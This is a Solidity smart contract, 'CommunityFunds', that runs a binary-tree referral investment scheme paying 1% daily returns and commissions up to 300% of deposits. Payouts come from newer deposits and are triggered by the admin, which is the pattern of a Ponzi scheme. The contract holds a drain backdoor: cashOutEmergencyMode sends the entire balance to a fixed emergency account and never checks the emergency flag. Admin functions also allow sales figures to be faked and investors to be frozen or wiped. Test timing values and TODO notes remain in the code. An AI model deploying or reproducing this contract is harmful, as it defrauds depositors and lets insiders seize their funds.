1 pragma solidity ^0.4.25;
2 
3 // 26/10
4 
5 contract CommunityFunds {
6     event MaxOut (address investor, uint256 times, uint256 at);
7     // change OND_DAY to 86400
8     uint256 public constant ONE_DAY = 600;
9     address private admin;
10     uint256 private depositedAmountGross = 0;
11     uint256 private paySystemCommissionTimes = 1;
12     uint256 private payDailyIncomeTimes = 1;
13     uint256 private lastPaySystemCommission = now;
14     uint256 private lastPayDailyIncome = now;
15     uint256 private contractStartAt = now;
16     uint256 private lastReset = now;
17     // TODO change fund addresses
18     address private operationFund = 0xB35551f86F46d14c7CaB618285CE98100C883C14;
19     address private developmentFund = 0x7285D125f90b0e880edcDf08e0876b43a1a26730;
20     address private reserveFund = 0x59a5323EAE8d1e767430Aa6E32Bd7B48C8547AC4;
21     address private emergencyAccount = 0x6dd079f89D137367145c324E70CF94E11B35CFe7;
22     bool private emergencyMode = false;
23     mapping (address => Investor) investors;
24     address[] public investorAddresses;
25     mapping (bytes32 => Investment) investments;
26     mapping (bytes32 => Withdrawal) withdrawals;
27     bytes32[] private investmentIds;
28     bytes32[] private withdrawalIds;
29 
30     uint256 maximumMaxOutInWeek = 4;
31     
32     struct Investment {
33         bytes32 id;
34         uint256 at;
35         uint256 amount;
36         address investor;
37     }
38 
39     struct Withdrawal {
40         bytes32 id;
41         uint256 at;
42         uint256 amount;
43         address investor;
44         address presentee;
45         uint256 reason;
46         uint256 times;
47     }
48 
49     /*
50         reason 1: DIRECT COMMISSION
51         reason 2: DAILY COMMISSION
52         reason 3: SYSTEM COMMISSION
53         reason 4: RESERVE COMMISSION
54         reason 5: TEST COMMISSION
55         reason 6: END GAME
56     */
57 
58     struct Investor {
59         string email;
60         address parent;
61         address leftChild;
62         address rightChild;
63         address presenter;
64         uint256 generation;
65         address[] presentees;
66         uint256 depositedAmount;
67         uint256 withdrewAmount;
68         bool isDisabled;
69         uint256 lastMaxOut;
70         uint256 maxOutTimes;
71         uint256 maxOutTimesInWeek;
72         uint256 totalSell;
73         uint256 sellThisMonth;
74         bytes32[] investments;
75         bytes32[] withdrawals;
76         uint256 rightSell;
77         uint256 leftSell;
78         uint256 reserveCommission;
79         uint256 dailyIncomeWithrewAmount;
80     }
81 
82     constructor () public { admin = msg.sender; }
83     
84     modifier mustBeAdmin() { require(msg.sender == admin); _; }    
85     
86     function () payable public { deposit(); }
87     
88     // deposit and withdraw
89     
90     function deposit() payable public {
91         require(msg.value >= 0.2 ether);
92         Investor storage investor = investors[msg.sender];
93         // must be registered investor
94         require(investor.generation != 0);
95         require(investor.maxOutTimesInWeek < maximumMaxOutInWeek);
96         require(investor.maxOutTimes <= 200);
97         // TODO: change ONE_DAY * 2 to ONE_DAY * 7
98         require(investor.maxOutTimes == 0 || now - investor.lastMaxOut < ONE_DAY * 7 || investor.depositedAmount != 0);
99         depositedAmountGross += msg.value;
100         bytes32 id = keccak256(abi.encodePacked(block.number, now, msg.sender, msg.value));
101         uint256 investmentValue = investor.depositedAmount + msg.value <= 10 ether ? msg.value : 10 ether - investor.depositedAmount;
102         if (investmentValue == 0) return;
103         Investment memory investment = Investment({ id: id, at: now, amount: investmentValue, investor: msg.sender });
104         investments[id] = investment;
105         processInvestments(id);
106         investmentIds.push(id);
107     }
108     
109     function processInvestments(bytes32 investmentId) internal {
110         Investment storage investment = investments[investmentId];
111         uint256 amount = investment.amount;
112         Investor storage investor = investors[investment.investor];
113         investor.investments.push(investmentId);
114         investor.depositedAmount += amount;
115         // neu la root user thi ko co presenter
116         addSellForParents(investment.investor, amount);
117         address presenterAddress = investor.presenter;
118         Investor storage presenter = investors[presenterAddress];
119         if (presenterAddress != 0) {
120             presenter.totalSell += amount;
121             presenter.sellThisMonth += amount;
122         }
123         if (presenter.depositedAmount >= 0.2 ether && !presenter.isDisabled) {
124             sendEtherForInvestor(presenterAddress, amount / 10, 1, investment.investor, 0);
125         }
126     }
127 
128     function addSellForParents(address investorAddress, uint256 amount) internal {
129         Investor memory investor = investors[investorAddress];
130         address currentParentAddress = investor.parent;
131         address currentInvestorAddress = investorAddress;
132         uint256 loopCount = investor.generation - 1;
133         for(uint256 i = 0; i < loopCount; i++) {
134             Investor storage parent = investors[currentParentAddress];
135             if (parent.leftChild == currentInvestorAddress) parent.leftSell += amount;
136             else parent.rightSell += amount;
137             uint256 incomeTilNow = getAllIncomeTilNow(currentParentAddress);
138             if (incomeTilNow > 3 * parent.depositedAmount) {
139                 payDailyIncomeForInvestor(currentParentAddress, 0);
140                 paySystemCommissionInvestor(currentParentAddress, 0);
141             }
142             currentInvestorAddress = currentParentAddress;
143             currentParentAddress = parent.parent;
144         }
145     }
146 
147     function sendEtherForInvestor(address investorAddress, uint256 value, uint256 reason, address presentee, uint256 times) internal {
148         if (value == 0 || investorAddress == 0) return;
149         Investor storage investor = investors[investorAddress];
150         if (investor.reserveCommission > 0) {
151             bool isPass = investor.reserveCommission >= 3 * investor.depositedAmount;
152             uint256 reserveCommission = isPass ? investor.reserveCommission + value : investor.reserveCommission;
153             investor.reserveCommission = 0;
154             sendEtherForInvestor(investorAddress, reserveCommission, 4, 0, 0);
155             if (isPass) return;
156         }
157         uint256 withdrewAmount = investor.withdrewAmount;
158         uint256 depositedAmount = investor.depositedAmount;
159         uint256 amountToPay = value;
160         if (withdrewAmount + value >= 3 * depositedAmount) {
161             amountToPay = 3 * depositedAmount - withdrewAmount;
162             investor.reserveCommission = value - amountToPay;
163             if (reason != 2) investor.reserveCommission += getDailyIncomeForUser(investorAddress);
164             if (reason != 3) investor.reserveCommission += getUnpaidSystemCommission(investorAddress);
165             investor.maxOutTimes++;
166             investor.maxOutTimesInWeek++;
167             investor.depositedAmount = 0;
168             investor.withdrewAmount = 0;
169             investor.lastMaxOut = now;
170             investor.dailyIncomeWithrewAmount = 0;
171             emit MaxOut(investorAddress, investor.maxOutTimes, now);
172         } else {
173             investors[investorAddress].withdrewAmount += amountToPay;
174         }
175         if (amountToPay != 0) {
176             investorAddress.transfer(amountToPay / 100 * 90);
177             operationFund.transfer(amountToPay / 100 * 4);
178             developmentFund.transfer(amountToPay / 100 * 1);
179             reserveFund.transfer(amountToPay / 100 * 5);
180             bytes32 id = keccak256(abi.encodePacked(block.difficulty, now, investorAddress, amountToPay, reason));
181             Withdrawal memory withdrawal = Withdrawal({ id: id, at: now, amount: amountToPay, investor: investorAddress, presentee: presentee, times: times, reason: reason });
182             withdrawals[id] = withdrawal;
183             investor.withdrawals.push(id);
184             withdrawalIds.push(id);
185         }
186     }
187 
188 
189     function getAllIncomeTilNow(address investorAddress) internal view returns(uint256 allIncome) {
190         Investor memory investor = investors[investorAddress];
191         uint256 unpaidDailyIncome = getDailyIncomeForUser(investorAddress);
192         uint256 withdrewAmount = investor.withdrewAmount;
193         uint256 unpaidSystemCommission = getUnpaidSystemCommission(investorAddress);
194         uint256 allIncomeNow = unpaidDailyIncome + withdrewAmount + unpaidSystemCommission;
195         return allIncomeNow;
196     }
197 
198     // Get info
199 
200     function getContractInfo() public view returns (address _admin, uint256 _depositedAmountGross, address _developmentFund, address _operationFund, address _reserveFund, address _emergencyAccount, bool _emergencyMode, address[] _investorAddresses, uint256 balance, uint256 _paySystemCommissionTimes, uint256 _maximumMaxOutInWeek) {
201         return (admin, depositedAmountGross, developmentFund, operationFund, reserveFund, emergencyAccount, emergencyMode, investorAddresses, address(this).balance, paySystemCommissionTimes, maximumMaxOutInWeek);
202     }
203     
204     function getContractTime() public view returns(uint256 _contractStartAt, uint256 _lastReset, uint256 _oneDay, uint256 _lastPayDailyIncome, uint256 _lastPaySystemCommission) {
205         return (contractStartAt, lastReset, ONE_DAY, lastPayDailyIncome, lastPaySystemCommission);
206     }
207     
208     function getInvestorRegularInfo(address investorAddress) public view returns (string email, uint256 generation, uint256 rightSell, uint256 leftSell, uint256 reserveCommission, uint256 depositedAmount, uint256 withdrewAmount, bool isDisabled) {
209         Investor memory investor = investors[investorAddress];
210         return (
211             investor.email,
212             investor.generation,
213             investor.rightSell,
214             investor.leftSell,
215             investor.reserveCommission,
216             investor.depositedAmount,
217             investor.withdrewAmount,
218             investor.isDisabled
219         );
220     }
221     
222     function getInvestorAccountInfo(address investorAddress) public view returns (uint256 maxOutTimes, uint256 maxOutTimesInWeek, uint256 totalSell, bytes32[] investorIds, uint256 dailyIncomeWithrewAmount, uint256 unpaidSystemCommission, uint256 unpaidDailyIncome) {
223         Investor memory investor = investors[investorAddress];
224         return (
225             investor.maxOutTimes,
226             investor.maxOutTimesInWeek,
227             investor.totalSell,
228             investor.investments,
229             investor.dailyIncomeWithrewAmount,
230             getUnpaidSystemCommission(investorAddress),
231             getDailyIncomeForUser(investorAddress)
232         ); 
233     }
234     
235     function getInvestorTreeInfo(address investorAddress) public view returns (address leftChild, address rightChild, address parent, address presenter, uint256 sellThisMonth, uint256 lastMaxOut) {
236         Investor memory investor = investors[investorAddress];
237         return (
238             investor.leftChild,
239             investor.rightChild,
240             investor.parent,
241             investor.presenter,
242             investor.sellThisMonth,
243             investor.lastMaxOut
244         );
245     }
246     
247     function getWithdrawalsByTime(address investorAddress, uint256 start, uint256 end)public view returns(bytes32[] ids, uint256[] ats, uint256[] amounts, address[] presentees, uint256[] reasons, uint256[] times, bytes32[] emails) {
248         ids = new bytes32[](withdrawalIds.length);
249         ats = new uint256[](withdrawalIds.length);
250         amounts = new uint256[](withdrawalIds.length);
251         emails = new bytes32[](withdrawalIds.length);
252         presentees = new address[](withdrawalIds.length);
253         reasons = new uint256[](withdrawalIds.length);
254         times = new uint256[](withdrawalIds.length);
255         uint256 index = 0;
256         for (uint256 i = 0; i < withdrawalIds.length; i++) {
257             bytes32 id = withdrawalIds[i];
258             if (withdrawals[id].at < start || withdrawals[id].at > end) continue;
259             if (investorAddress != 0 && withdrawals[id].investor != investorAddress) continue;
260             ids[index] = id; 
261             ats[index] = withdrawals[id].at;
262             amounts[index] = withdrawals[id].amount;
263             emails[index] = stringToBytes32(investors[withdrawals[id].investor].email);
264             reasons[index] = withdrawals[id].reason;
265             times[index] = withdrawals[id].times;
266             presentees[index] = withdrawals[id].presentee;
267             index++;
268         }
269         return (ids, ats, amounts, presentees, reasons, times, emails);
270     }
271     
272     function getInvestmentsByTime(address investorAddress, uint256 start, uint256 end)public view returns(bytes32[] ids, uint256[] ats, uint256[] amounts, bytes32[] emails) {
273         ids = new bytes32[](investmentIds.length);
274         ats = new uint256[](investmentIds.length);
275         amounts = new uint256[](investmentIds.length);
276         emails = new bytes32[](investmentIds.length);
277         uint256 index = 0;
278         for (uint256 i = 0; i < investmentIds.length; i++) {
279             bytes32 id = investmentIds[i];
280             if (investorAddress != 0 && investments[id].investor != investorAddress) continue;
281             if (investments[id].at < start || investments[id].at > end) continue;
282             ids[index] = id;
283             ats[index] = investments[id].at;
284             amounts[index] = investments[id].amount;
285             emails[index] = stringToBytes32(investors[investments[id].investor].email);
286             index++;
287         }
288         return (ids, ats, amounts, emails);
289     }
290 
291     function getNodesAddresses(address rootNodeAddress) internal view returns(address[]){
292         uint256 maxLength = investorAddresses.length;
293         address[] memory nodes = new address[](maxLength);
294         nodes[0] = rootNodeAddress;
295         uint256 processIndex = 0;
296         uint256 nextIndex = 1;
297         while (processIndex != nextIndex) {
298             Investor memory currentInvestor = investors[nodes[processIndex++]];
299             if (currentInvestor.leftChild != 0) nodes[nextIndex++] = currentInvestor.leftChild;
300             if (currentInvestor.rightChild != 0) nodes[nextIndex++] = currentInvestor.rightChild;
301         }
302         return nodes;
303     }
304 
305     function stringToBytes32(string source) internal pure returns (bytes32 result) {
306         bytes memory tempEmptyStringTest = bytes(source);
307         if (tempEmptyStringTest.length == 0) return 0x0;
308         assembly { result := mload(add(source, 32)) }
309     }
310 
311     function getInvestorTree(address rootInvestor) public view returns(address[] nodeInvestors, bytes32[] emails, uint256[] leftSells, uint256[] rightSells, address[] parents, uint256[] generations, uint256[] deposits){
312         nodeInvestors = getNodesAddresses(rootInvestor);
313         uint256 length = nodeInvestors.length;
314         leftSells = new uint256[](length);
315         rightSells = new uint256[](length);
316         emails = new bytes32[] (length);
317         parents = new address[] (length);
318         generations = new uint256[] (length);
319         deposits = new uint256[] (length);
320         for (uint256 i = 0; i < length; i++) {
321             Investor memory investor = investors[nodeInvestors[i]];
322             parents[i] = investor.parent;
323             string memory email = investor.email;
324             emails[i] = stringToBytes32(email);
325             leftSells[i] = investor.leftSell;
326             rightSells[i] = investor.rightSell;
327             generations[i] = investor.generation;
328             deposits[i] = investor.depositedAmount;
329         }
330         return (nodeInvestors, emails, leftSells, rightSells, parents, generations, deposits);
331     }
332 
333     function getListInvestor() public view returns (address[] nodeInvestors, bytes32[] emails, uint256[] unpaidSystemCommissions, uint256[] unpaidDailyIncomes, uint256[] depositedAmounts, uint256[] withdrewAmounts, bool[] isDisableds) {
334         uint256 length = investorAddresses.length;
335         unpaidSystemCommissions = new uint256[](length);
336         unpaidDailyIncomes = new uint256[](length);
337         emails = new bytes32[] (length);
338         depositedAmounts = new uint256[] (length);
339         unpaidSystemCommissions = new uint256[] (length);
340         isDisableds = new bool[] (length);
341         unpaidDailyIncomes = new uint256[] (length); 
342         withdrewAmounts = new uint256[](length);
343         for (uint256 i = 0; i < length; i++) {
344             Investor memory investor = investors[investorAddresses[i]];
345             depositedAmounts[i] = investor.depositedAmount;
346             string memory email = investor.email;
347             emails[i] = stringToBytes32(email);
348             withdrewAmounts[i] = investor.withdrewAmount;
349             isDisableds[i] = investor.isDisabled;
350             unpaidSystemCommissions[i] = getUnpaidSystemCommission(investorAddresses[i]);
351             unpaidDailyIncomes[i] = getDailyIncomeForUser(investorAddresses[i]);
352         }
353         return (investorAddresses, emails, unpaidSystemCommissions, unpaidDailyIncomes, depositedAmounts, withdrewAmounts, isDisableds);
354     }
355     
356     // Put tree
357 
358     function putPresentee(address presenterAddress, address presenteeAddress, address parentAddress, string presenteeEmail, bool isLeft) public mustBeAdmin {
359         Investor storage presenter = investors[presenterAddress];
360         Investor storage parent = investors[parentAddress];
361         if (investorAddresses.length != 0) {
362             require(presenter.generation != 0);
363             require(parent.generation != 0);
364             if (isLeft) {
365                 require(parent.leftChild == 0); 
366             } else {
367                 require(parent.rightChild == 0); 
368             }
369         }
370         // investor dau tien khong co presenter, thi khong them vao mang presentees
371         if (presenter.generation != 0) presenter.presentees.push(presenteeAddress);
372         Investor memory investor = Investor({
373             email: presenteeEmail,
374             parent: parentAddress,
375             leftChild: 0,
376             rightChild: 0,
377             presenter: presenterAddress,
378             generation: parent.generation + 1, // neu khong co presenter, presenter.generation = 0
379             presentees: new address[](0),
380             depositedAmount: 0,
381             withdrewAmount: 0,
382             isDisabled: false,
383             lastMaxOut: now,
384             maxOutTimes: 0,
385             maxOutTimesInWeek: 0,
386             totalSell: 0,
387             sellThisMonth: 0,
388             investments: new bytes32[](0),
389             withdrawals: new bytes32[](0),
390             rightSell: 0,
391             leftSell: 0,
392             reserveCommission: 0,
393             dailyIncomeWithrewAmount: 0
394         });
395         investors[presenteeAddress] = investor;
396         // neu khong co parent thi thoi
397         investorAddresses.push(presenteeAddress);
398         if (parent.generation == 0) return;
399         if (isLeft) {
400             parent.leftChild = presenteeAddress;
401         } else {
402             parent.rightChild = presenteeAddress;
403         }
404     }
405 
406     // Pay daily income
407 
408     function getDailyIncomeForUser(address investorAddress) internal view returns(uint256 amount) {
409         Investor memory investor = investors[investorAddress];
410         uint256 investmentLength = investor.investments.length;
411         uint256 dailyIncome = 0;
412         for (uint256 i = 0; i < investmentLength; i++) {
413             Investment memory investment = investments[investor.investments[i]];
414             if (investment.at < investor.lastMaxOut) continue; 
415             if (now - investment.at >= ONE_DAY) {
416                 uint256 numberOfDay = (now - investment.at) / ONE_DAY;
417                 uint256 totalDailyIncome = numberOfDay * investment.amount / 100;
418                 dailyIncome = totalDailyIncome + dailyIncome;
419             }
420         }
421         return dailyIncome - investor.dailyIncomeWithrewAmount;
422     }
423     
424     function payDailyIncomeForInvestor(address investorAddress, uint256 times) public mustBeAdmin {
425         uint256 dailyIncome = getDailyIncomeForUser(investorAddress);
426         if (investors[investorAddress].isDisabled) return;
427         investors[investorAddress].dailyIncomeWithrewAmount += dailyIncome;
428         sendEtherForInvestor(investorAddress, dailyIncome, 2, 0, times);
429     }
430     
431     function payDailyIncomeByIndex(uint256 from, uint256 to) public mustBeAdmin{
432         require(from >= 0 && to < investorAddresses.length);
433         for(uint256 i = from; i <= to; i++) {
434             payDailyIncomeForInvestor(investorAddresses[i], payDailyIncomeTimes);
435         }
436     }
437     
438     // Pay system commission
439 
440     function getTotalSellLevel(uint256 totalSell) internal pure returns (uint256 level){
441         if (totalSell < 30 ether) return 0;
442         if (totalSell < 60 ether) return 1;
443         if (totalSell < 90 ether) return 2;
444         if (totalSell < 120 ether) return 3;
445         if (totalSell < 150 ether) return 4;
446         return 5;
447     }
448     
449     function getSellThisMonthLevel(uint256 sellThisMonth) internal pure returns (uint256 level){
450         if (sellThisMonth < 2 ether) return 0;
451         if (sellThisMonth < 4 ether) return 1;
452         if (sellThisMonth < 6 ether) return 2;
453         if (sellThisMonth < 8 ether) return 3;
454         if (sellThisMonth < 10 ether) return 4;
455         return 5;
456     }
457     
458     function getDepositLevel(uint256 sellThisMonth) internal pure returns (uint256 level){
459         if (sellThisMonth < 2 ether) return 0;
460         if (sellThisMonth < 4 ether) return 1;
461         if (sellThisMonth < 6 ether) return 2;
462         if (sellThisMonth < 8 ether) return 3;
463         if (sellThisMonth < 10 ether) return 4;
464         return 5;
465     }
466     
467     function getPercentage(uint256 depositedAmount, uint256 totalSell, uint256 sellThisMonth) internal pure returns(uint256 level) {
468         uint256 totalSellLevel = getTotalSellLevel(totalSell);
469         uint256 depLevel = getDepositLevel(depositedAmount);
470         uint256 sellThisMonthLevel = getSellThisMonthLevel(sellThisMonth);
471         uint256 min12 = totalSellLevel < depLevel ? totalSellLevel : depLevel;
472         uint256 minLevel = sellThisMonthLevel < min12 ? sellThisMonthLevel : min12;
473         return minLevel * 2;
474     }
475 
476     function getUnpaidSystemCommission(address investorAddress) public view returns(uint256 unpaid) {
477         Investor memory investor = investors[investorAddress];
478         uint256 depositedAmount = investor.depositedAmount;
479         uint256 totalSell = investor.totalSell;
480         uint256 leftSell = investor.leftSell;
481         uint256 rightSell = investor.rightSell;
482         uint256 sellThisMonth = investor.sellThisMonth;
483         uint256 sellToPaySystemCommission = rightSell < leftSell ? rightSell : leftSell;
484         uint256 commission = sellToPaySystemCommission * getPercentage(depositedAmount, totalSell, sellThisMonth) / 100;
485         return commission;
486     }
487     
488     function paySystemCommissionInvestor(address investorAddress, uint256 times) public mustBeAdmin {
489         Investor storage investor = investors[investorAddress];
490         if (investor.isDisabled) return;
491         uint256 systemCommission = getUnpaidSystemCommission(investorAddress);
492         if (paySystemCommissionTimes > 3 && times != 0) {
493             investor.rightSell = 0;
494             investor.leftSell = 0;
495         } else if (investor.rightSell >= investor.leftSell) {
496             investor.rightSell = investor.rightSell - investor.leftSell;
497             investor.leftSell = 0;
498         } else {
499             investor.leftSell = investor.leftSell - investor.rightSell;
500             investor.rightSell = 0;
501         }
502         if (times != 0) investor.sellThisMonth = 0;
503         sendEtherForInvestor(investorAddress, systemCommission, 3, 0, times);
504     }
505 
506     function paySystemCommissionByIndex(uint256 from, uint256 to) public mustBeAdmin {
507          require(from >= 0 && to < investorAddresses.length);
508         // change 1 to 30
509         if (now <= 30 * ONE_DAY + contractStartAt) return;
510         for(uint256 i = from; i <= to; i++) {
511             paySystemCommissionInvestor(investorAddresses[i], paySystemCommissionTimes);
512         }
513      }
514 
515 
516     function finishPayDailyIncome() public mustBeAdmin {
517         lastPayDailyIncome = now;
518         payDailyIncomeTimes++;
519     }
520     
521     function finishPaySystemCommission() public mustBeAdmin {
522         lastPaySystemCommission = now;
523         paySystemCommissionTimes++;
524     }
525 
526     // ememergency mode
527 
528     function turnOnEmergencyMode() public mustBeAdmin { emergencyMode = true; }
529 
530     function cashOutEmergencyMode() public {
531         require(msg.sender == emergencyAccount);
532         msg.sender.transfer(address(this).balance);
533     }
534     
535     // reset functions
536     
537     function resetGame(address[] yesInvestors, address[] noInvestors) public mustBeAdmin {
538         lastReset = now;
539         uint256 yesInvestorsLength = yesInvestors.length;
540         for (uint256 i = 0; i < yesInvestorsLength; i++) {
541             address yesInvestorAddress = yesInvestors[i];
542             Investor storage yesInvestor = investors[yesInvestorAddress];
543             if (yesInvestor.maxOutTimes > 0 || (yesInvestor.withdrewAmount > yesInvestor.depositedAmount && yesInvestor.withdrewAmount != 0)) {
544                 yesInvestor.lastMaxOut = now;
545                 yesInvestor.depositedAmount = 0;
546                 yesInvestor.withdrewAmount = 0;
547                 yesInvestor.dailyIncomeWithrewAmount = 0;
548             }
549             yesInvestor.reserveCommission = 0;
550             yesInvestor.rightSell = 0;
551             yesInvestor.leftSell = 0;
552             yesInvestor.totalSell = 0;
553             yesInvestor.sellThisMonth = 0;
554         }
555         uint256 noInvestorsLength = noInvestors.length;
556         for (uint256 j = 0; j < noInvestorsLength; j++) {
557             address noInvestorAddress = noInvestors[j];
558             Investor storage noInvestor = investors[noInvestorAddress];
559             if (noInvestor.maxOutTimes > 0 || (noInvestor.withdrewAmount > noInvestor.depositedAmount && noInvestor.withdrewAmount != 0)) {
560                 noInvestor.isDisabled = true;
561                 noInvestor.reserveCommission = 0;
562                 noInvestor.lastMaxOut = now;
563                 noInvestor.depositedAmount = 0;
564                 noInvestor.withdrewAmount = 0;
565                 noInvestor.dailyIncomeWithrewAmount = 0;
566             }
567             noInvestor.reserveCommission = 0;
568             noInvestor.rightSell = 0;
569             noInvestor.leftSell = 0;
570             noInvestor.totalSell = 0;
571             noInvestor.sellThisMonth = 0;
572         }
573     }
574 
575     function stopGame(uint256 percent, uint256 from, uint256 to) mustBeAdmin public {
576         require(percent <= 50);
577         require(from >= 0 && to < investorAddresses.length);
578         for (uint256 i = from; i <= to; i++) {
579             address investorAddress = investorAddresses[i];
580             Investor storage investor = investors[investorAddress];
581             if (investor.maxOutTimes > 0) continue;
582             if (investor.isDisabled) continue;
583             uint256 depositedAmount = investor.depositedAmount;
584             uint256 withdrewAmount = investor.withdrewAmount;
585             if (withdrewAmount >= depositedAmount / 2) continue;
586             sendEtherForInvestor(investorAddress, depositedAmount * percent / 100 - withdrewAmount, 6, 0, 0);
587         }
588     }
589     
590     function revivalInvestor(address investor) public mustBeAdmin { investors[investor].lastMaxOut = now; }
591 
592     // 300 % daily
593 
594     function specifyGame(address user, uint256 totalSell, uint256 sellThisMonth, uint256 rightSell, uint256 leftSell) public mustBeAdmin {
595         Investor storage investor = investors[user];
596         require(investor.generation > 0);
597         investor.totalSell = totalSell;
598         investor.sellThisMonth = sellThisMonth;
599         investor.rightSell = rightSell;
600         investor.leftSell = leftSell;
601     }
602 
603     function getPercentToMaxOut(address investorAddress) public view returns(uint256) {
604         uint256 depositedAmount = investors[investorAddress].depositedAmount;
605         if (depositedAmount == 0) return 0;
606         uint256 unpaidSystemCommissions = getUnpaidSystemCommission(investorAddress);
607         uint256 unpaidDailyIncomes = getDailyIncomeForUser(investorAddress);
608         uint256 withdrewAmount = investors[investorAddress].withdrewAmount;
609         uint256 percent = 100 * (unpaidSystemCommissions + unpaidDailyIncomes + withdrewAmount) / depositedAmount;
610         return percent;
611     }
612 
613     function payToReachMaxOut(address investorAddress) public mustBeAdmin{
614         uint256 unpaidSystemCommissions = getUnpaidSystemCommission(investorAddress);
615         uint256 unpaidDailyIncomes = getDailyIncomeForUser(investorAddress);
616         uint256 withdrewAmount = investors[investorAddress].withdrewAmount;
617         uint256 depositedAmount = investors[investorAddress].depositedAmount;
618         uint256 reserveCommission = investors[investorAddress].reserveCommission;
619         require(depositedAmount > 0  && withdrewAmount + unpaidSystemCommissions + unpaidDailyIncomes + reserveCommission >= 3 * depositedAmount);
620         investors[investorAddress].reserveCommission = 0;
621         sendEtherForInvestor(investorAddress, reserveCommission, 4, 0, 0);
622         payDailyIncomeForInvestor(investorAddress, 0);
623         paySystemCommissionInvestor(investorAddress, 0);
624     }
625 
626     function getMaxOutUser() public view returns (address[] nodeInvestors, uint256[] unpaidSystemCommissions, uint256[] unpaidDailyIncomes, uint256[] depositedAmounts, uint256[] withdrewAmounts, uint256[] reserveCommissions, bool[] isDisableds) {
627         uint256 length = investorAddresses.length;
628         unpaidSystemCommissions = new uint256[](length);
629         unpaidDailyIncomes = new uint256[](length);
630         depositedAmounts = new uint256[] (length);
631         unpaidSystemCommissions = new uint256[] (length);
632         reserveCommissions = new uint256[] (length);
633         unpaidDailyIncomes = new uint256[] (length); 
634         withdrewAmounts = new uint256[](length);
635         isDisableds = new bool[](length);
636         for (uint256 i = 0; i < length; i++) {
637             Investor memory investor = investors[investorAddresses[i]];
638             depositedAmounts[i] = investor.depositedAmount;
639             withdrewAmounts[i] = investor.withdrewAmount;
640             reserveCommissions[i] = investor.reserveCommission;
641             unpaidSystemCommissions[i] = getUnpaidSystemCommission(investorAddresses[i]);
642             unpaidDailyIncomes[i] = getDailyIncomeForUser(investorAddresses[i]);
643             isDisableds[i] = investor.isDisabled;
644         }
645         return (investorAddresses, unpaidSystemCommissions, unpaidDailyIncomes, depositedAmounts, withdrewAmounts, reserveCommissions, isDisableds);
646     }
647 
648     function getLazyInvestor() public view returns (bytes32[] emails, address[] addresses, uint256[] lastDeposits, uint256[] depositedAmounts, uint256[] sellThisMonths, uint256[] totalSells, uint256[] maxOuts) {
649         uint256 length = investorAddresses.length;
650         emails = new bytes32[] (length);
651         lastDeposits = new uint256[] (length);
652         addresses = new address[](length);
653         depositedAmounts = new uint256[] (length);
654         sellThisMonths = new uint256[] (length);
655         totalSells = new uint256[](length);
656         maxOuts = new uint256[](length);
657         uint256 index = 0;
658         for (uint256 i = 0; i < length; i++) {
659             Investor memory investor = investors[investorAddresses[i]];
660             if (investor.withdrewAmount >= investor.depositedAmount) continue;
661             lastDeposits[index] = investor.investments.length != 0 ? investments[investor.investments[investor.investments.length - 1]].at : 0;
662             emails[index] = stringToBytes32(investor.email);
663             addresses[index] = investorAddresses[i];
664             depositedAmounts[index] = investor.depositedAmount;
665             sellThisMonths[index] = investor.sellThisMonth;
666             totalSells[index] = investor.totalSell;
667             maxOuts[index] = investor.maxOutTimes;
668             index++;
669         }
670         return (emails, addresses, lastDeposits, depositedAmounts, sellThisMonths, totalSells, maxOuts);
671     }
672   
673     function resetMaxOutInWeek() public mustBeAdmin {
674         uint256 length = investorAddresses.length;
675         for (uint256 i = 0; i < length; i++) {
676             address investorAddress = investorAddresses[i];
677             investors[investorAddress].maxOutTimesInWeek = 0;
678         }
679     }
680     
681     function setMaximumMaxOutInWeek(uint256 maximum) public mustBeAdmin{ maximumMaxOutInWeek = maximum; }
682 
683     function disableInvestor(address investorAddress) public mustBeAdmin {
684         Investor storage investor = investors[investorAddress];
685         investor.isDisabled = true;
686     }
687     
688     function enableInvestor(address investorAddress) public mustBeAdmin {
689         Investor storage investor = investors[investorAddress];
690         investor.isDisabled = false;
691     }
692     
693     function donate() payable public { depositedAmountGross += msg.value; }
694 }